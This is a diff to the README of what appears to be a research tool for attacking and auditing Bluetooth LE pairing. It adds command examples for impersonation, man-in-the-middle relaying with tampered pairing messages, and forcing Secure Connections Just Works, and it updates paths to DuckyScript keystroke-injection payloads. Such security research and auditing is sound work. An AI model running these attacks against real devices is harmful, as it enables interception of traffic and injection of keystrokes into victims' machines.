@@ -111,7 +111,21 @@ sudo ./build/bleurp blerp pi AA:BB:CC:DD:EE:FF -s 11:22:33:44:55:66 -n "Keyboard
 # Central Impersonation (CI): spoof central, inject unauthenticated Pairing Request (V2/V4/V6)
 sudo ./build/bleurp blerp ci 11:22:33:44:55:66 -s AA:BB:CC:DD:EE:FF -k 7 -r 0x01
 
-# Full automated evaluation of V1 to V6 against a target:
+# Double-channel MitM: PI against the victim Central (-i) + CI against the victim Peripheral (-j),
+# two independent PKs with the attacker on each side.
+sudo ./build/bleurp blerp mitm AA:BB:CC:DD:EE:FF -i 0 -j 1
+
+# Single-channel MitM: relays real SMP between the two victims, tampering only the
+# feature-negotiation PDUs (Pairing Request/Response) -- Fig. 6 of the paper.
+sudo ./build/bleurp blerp mitm-single AA:BB:CC:DD:EE:FF -i 0 -j 1
+
+# PI against a peer locked to Secure Connections Only: -S completes real SC Just Works
+# instead of only downgrading to Legacy (which such a peer would refuse outright).
+sudo ./build/bleurp blerp pi AA:BB:CC:DD:EE:FF -s 11:22:33:44:55:66 -S
+
+# Full automated evaluation of V1 to V6 against a target, plus the VII-A hardened
+# re-pairing rule table (Consistency Check / Anti-Downgrade / Encryption Failure
+# Termination) derived from the same run:
 sudo ./build/bleurp blerp audit AA:BB:CC:DD:EE:FF -t public -i 0
 ```
 
@@ -119,10 +133,10 @@ sudo ./build/bleurp blerp audit AA:BB:CC:DD:EE:FF -t public -i 0
 
 ```sh
 # Start native BLE keyboard peripheral (advertises HOGP keyboard, handles SMP pairing):
-./build/bleurp keyboard -i 0 -n "BLEURP Keyboard" -d src/send_attack/payloads/demo-hello.txt
+./build/bleurp keyboard -i 0 -n "BLEURP Keyboard" -d src/hid/send_attack/payloads/demo-hello.txt
 
 # Inject DuckyScript payload via BlueZ D-Bus:
-./build/bleurp hid -i hci0 -t AA:BB:CC:DD:EE:FF -f src/send_attack/payloads/linux-terminal.txt
+./build/bleurp hid -i hci0 -t AA:BB:CC:DD:EE:FF -f src/hid/send_attack/payloads/linux-terminal.txt
 ```
 
 ---
